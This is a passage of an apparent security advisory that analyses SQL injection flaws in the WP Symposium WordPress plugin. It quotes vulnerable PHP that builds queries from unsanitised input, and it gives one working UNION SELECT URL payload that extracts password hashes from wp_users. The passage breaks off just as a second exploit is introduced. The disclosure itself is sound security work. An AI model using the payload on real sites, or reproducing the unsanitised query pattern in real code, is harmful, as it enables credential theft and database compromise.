class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">get_symposium_meta</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'share'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-46"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-i">WPS_DEBUG</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">echo</span><span class="crayon-h"> </span><span class="crayon-s">'UID:'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;br /&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-47"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&amp;lt;div id="symposium_current_user_page" style="display:none"&amp;gt;'</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">uid</span><span class="crayon-sy">.</span><span class="crayon-s">'&amp;lt;/div&amp;gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-48">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-49"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">share</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'public'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50f2397335105-50">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50f2397335105-51"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">user</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT display_name FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-</span><span class="crayon-o">&amp;</span><span class="crayon-i">gt</span><span class="crayon-sy">;</span><span class="crayon-v">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users WHERE ID = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">uid</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0155 seconds] -->
<p>Note that the last line takes the $uid variable as determined on the first block of code, and simply puts it straight into the query without any sort of input sanitation. So by creating a page with the &#8220;[symposium-profile-menu]&#8221; short-tag, we can inject into the page with a simple URL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b50fe983395937" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
http://192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b50fe983395937-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b50fe983395937-1"><span class="crayon-i">http</span><span class="crayon-o">:</span><span class="crayon-c">//192.168.80.130/wordpress/?page_id=52&amp;uid=3535 UNION SELECT user_pass from wp_users</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p><strong>Analysis of forum updateEditDetail blind SQL injection vulnerability</strong></p>
<p>This vulnerability is actually more like 2. We can see that in this standard ajax call in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_forum_functions.php">/ajax/symposium_forum_functions.php</a> file that there is a total of 4 SQL queries executed, 2 updates and 2 selects. Notice that the $_POST parameters aren&#8217;t sanitized before use, yet all but the 3rd query uses concatenation to create the SQL query, which creates SQL injection conditions if you are logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b5107932596164" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// AJAX function to update topic details after editing
if ($_POST['action'] == 'updateEditDetails') {

	if (is_user_logged_in()) {

		$tid = $_POST['tid'];	

		$topic_subject = $_POST['topic_subject'];	
		$topic_post = $_POST['topic_post'];

		if (get_option('symposium_striptags') == 'on') {
			$topic_subject = strip_tags($topic_subject);	
			$topic_post = strip_tags($topic_post);	
		}

		$topic_post = str_replace("\n", chr(13), $topic_post);	
		$topic_category = $_POST['topic_category'];

		// Ensure safe HTML
		$topic_subject = str_replace("&lt;", "&amp;lt;", $topic_subject);	
		$topic_subject = str_replace("&gt;", "&amp;gt;", $topic_subject);	
		if (get_option('symposium_use_wysiwyg') != 'on') {
			$topic_post = str_replace("&lt;", "&amp;lt;", $topic_post);	
			$topic_post = str_replace("&gt;", "&amp;gt;", $topic_post);
		}

		if ($topic_category == "") {
			$topic_category = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_category FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));
		}

		$wpdb-&gt;query( $wpdb-&gt;prepare("UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_category = ".$topic_category." WHERE topic_parent = ".$tid) );

		$sql = "UPDATE ".$wpdb-&gt;prefix."symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d";
		$wpdb-&gt;query( $wpdb-&gt;prepare($sql, $topic_subject, $topic_post, $topic_category, $tid) );

		$parent = $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT topic_parent FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid));

	}

	exit;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1644">1644</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1645">1645</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1646">1646</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1647">1647</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1648">1648</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1649">1649</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1650">1650</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1651">1651</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1652">1652</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1653">1653</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1654">1654</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1655">1655</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1656">1656</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1657">1657</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1658">1658</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1659">1659</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1660">1660</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1661">1661</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1662">1662</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1663">1663</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1664">1664</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1665">1665</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1666">1666</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1667">1667</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1668">1668</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1669">1669</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1670">1670</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1671">1671</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1672">1672</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1673">1673</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1674">1674</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1675">1675</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1676">1676</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1677">1677</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1678">1678</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1679">1679</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1680">1680</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1681">1681</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1682">1682</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b5107932596164-1683">1683</div><div class="crayon-num" data-line="crayon-53c98e78b5107932596164-1684">1684</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b5107932596164-1644"><span class="crayon-c">// AJAX function to update topic details after editing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1645"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'updateEditDetails'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1646">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1647"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1648">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1649"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$tid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'tid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1650">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1651"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_subject'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1652"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_post'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1653">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1654"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_striptags'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1655"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1656"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">strip_tags</span><span class="crayon-sy">(</span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1657"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1658">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1659"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"\n"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-cn">13</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1660"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_category'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1661">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1662"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Ensure safe HTML</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1663"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1664"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1665"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_use_wysiwyg'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1666"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1667"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1668"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1669">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1670"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1671"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_category FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1672"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1673">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1674"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_category = "</span><span class="crayon-sy">.</span><span class="crayon-v">$topic_category</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE topic_parent = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1675">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1676"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1677"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_category</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1678">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1679"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$parent</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_parent FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1680">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1681"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1682">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b5107932596164-1683"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b5107932596164-1684"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0149 seconds] -->
<p>We can exploit it like this with an appropriate set of cookies:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b5112610103636" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
